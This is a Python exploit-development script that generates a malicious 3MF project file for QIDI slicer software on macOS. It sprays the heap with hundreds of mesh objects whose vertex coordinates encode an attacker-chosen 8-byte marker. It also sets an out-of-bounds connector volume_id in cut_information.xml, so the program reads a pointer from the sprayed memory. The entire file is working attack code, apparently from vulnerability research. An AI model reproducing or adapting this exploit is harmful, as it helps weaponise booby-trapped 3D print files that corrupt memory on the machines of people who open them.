#!/usr/bin/env python3
# Build a macOS/QIDI 3mf that sprays the small heap with MANY small marker meshes,
# each vertex-buffer filled with a chosen 8-byte marker so an OOB volume_id read
# (P = *(volumes.data()+vid*8)) that lands in a spray buffer returns P = marker.
import sys, os, zipfile, struct
TEMPLATE="/tmp/win/evil.3mf"     # working QIDI-compatible container (has cut_information.xml)
OUT="/tmp/qidiwork/spray.3mf"
vid       = int(sys.argv[1]) if len(sys.argv)>1 else 134217728
marker_hex= sys.argv[2] if len(sys.argv)>2 else "4141414141414141"   # 8 bytes LE value we want P to become
N_OBJ     = int(sys.argv[3]) if len(sys.argv)>3 else 300              # spray objects
N_VTX     = int(sys.argv[4]) if len(sys.argv)>4 else 60               # vertices per spray mesh (multiple of 3)

marker = bytes.fromhex(marker_hex)              # little-endian bytes as they'll sit in memory
assert len(marker)==8
# a coord float whose 4 bytes = marker[0:4] and marker[4:8]; to make EVERY 8-aligned window==marker
# the whole buffer must be the 8-byte marker repeated. vertex=12 bytes => need period-8 stream.
# We emit raw floats so that concatenated vertex bytes == marker repeated.
def stream_byte(i): return marker[i % 8]
def coord_floats_for_vertex(vidx):
    # bytes [12*vidx .. 12*vidx+11] of the global stream
    b = bytes(stream_byte(12*vidx + j) for j in range(12))
    return struct.unpack('<fff', b)
def f2s(f):
    # round-trip-safe float text
    s = repr(f)
    return s
# build spray object XML (inline meshes in 3dmodel.model)
def spray_object(obj_id):
    vs=[]
    for vi in range(N_VTX):
        x,y,z = coord_floats_for_vertex(vi)
        vs.append(f'<vertex x="{f2s(x)}" y="{f2s(y)}" z="{f2s(z)}"/>')
    ts=[]
    for t in range(0, N_VTX-2, 3):
        ts.append(f'<triangle v1="{t}" v2="{t+1}" v3="{t+2}"/>')
    return (f'<object id="{obj_id}" type="model"><mesh><vertices>'+''.join(vs)+
            '</vertices><triangles>'+''.join(ts)+'</triangles></mesh></object>')
# read template 3dmodel.model, inject spray objects + build items before </resources>/</build>
zin=zipfile.ZipFile(TEMPLATE,"r")
model=zin.read("3D/3dmodel.model").decode()
spray_objs="".join(spray_object(100+i) for i in range(N_OBJ))
spray_items="".join(f'<item objectid="{100+i}" transform="1 0 0 0 1 0 0 0 1 10 10 0.1" printable="1"/>' for i in range(N_OBJ))
model=model.replace("</resources>", spray_objs+"</resources>")
model=model.replace("</build>", spray_items+"</build>")
# cut_information.xml with chosen vid
cut=('<?xml version="1.0" encoding="utf-8"?>\n<objects>\n'
     ' <object id="1">\n  <cut_id id="0" check_sum="1" connectors_cnt="1"/>\n  <connectors>\n'
     f'   <connector volume_id="{vid}" type="0" radius="8391460.0" height="8391460.0" r_tolerance="8391460.0" h_tolerance="8391460.0"/>\n'
     '  </connectors>\n </object>\n'
     ' <object id="2"><cut_id id="0" check_sum="1" connectors_cnt="0"/></object>\n'
     ' <object id="3"><cut_id id="0" check_sum="1" connectors_cnt="0"/></object>\n'
     ' <object id="4"><cut_id id="0" check_sum="1" connectors_cnt="0"/></object>\n</objects>\n')
if os.path.exists(OUT): os.remove(OUT)
zout=zipfile.ZipFile(OUT,"w",zipfile.ZIP_DEFLATED)
for it in zin.infolist():
    data=zin.read(it.filename)
    if it.filename=="3D/3dmodel.model": data=model.encode()
    elif it.filename=="Metadata/cut_information.xml": data=cut.encode()
    zout.writestr(it, data)
zin.close(); zout.close()
print(f"built {OUT}: vid={vid} marker={marker_hex} spray={N_OBJ}x{N_VTX}v size={os.path.getsize(OUT)}")
